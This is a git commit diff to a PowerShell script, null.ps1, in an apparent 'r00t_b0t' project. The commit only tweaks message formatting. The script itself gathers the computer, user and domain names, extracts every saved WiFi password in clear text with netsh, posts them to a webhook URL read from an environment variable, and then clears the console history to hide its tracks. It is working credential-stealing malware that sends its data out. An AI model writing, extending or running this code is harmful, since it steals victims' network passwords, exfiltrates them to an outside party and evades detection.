ae83d7db3da78213c63e6a5fd97319f82af26bb3
deathesther <122229257+Esther7171@users.noreply.github.com>
2026-06-19 13:39:08 +0530

    Update null.ps1

--- scripts/null.ps1
+++ scripts/null.ps1
@@ -1,12 +1,11 @@
 $wh=$env:WH
-$m="```"+"`n"
-$m=$m+"[r00t_b0t] Incoming Data"+"`n"
+$m="[r00t_b0t] Incoming Data"+"`n"
 $m=$m+"================================"+"`n"
 $m=$m+"PC      : "+$env:COMPUTERNAME+"`n"
 $m=$m+"User    : "+$env:USERNAME+"`n"
 $m=$m+"Domain  : "+$env:USERDOMAIN+"`n"
 $m=$m+"================================"+"`n"
-$m=$m+"WiFi Passwords :"+"`n"
+$m=$m+"WiFi Passwords"+"`n"
 $m=$m+"--------------------------------"+"`n"
 $profiles=netsh wlan show profiles|Select-String "All User Profile"
 foreach($line in $profiles){
@@ -14,7 +13,6 @@ $n=($line -split ":")[1].Trim()
 $key=netsh wlan show profile name=$n key=clear|Select-String "Key Content"
 if($key){$m=$m+"Network  : "+$n+"`nPassword : "+($key -split ":")[1].Trim()+"`n--------------------------------`n"}
 }
-$m=$m+"```"
 $body=ConvertTo-Json @{content=$m}
 Invoke-RestMethod -Uri $wh -Method Post -ContentType "application/json" -Body $body
 [Microsoft.PowerShell.PSConsoleReadLine]::ClearHistory()
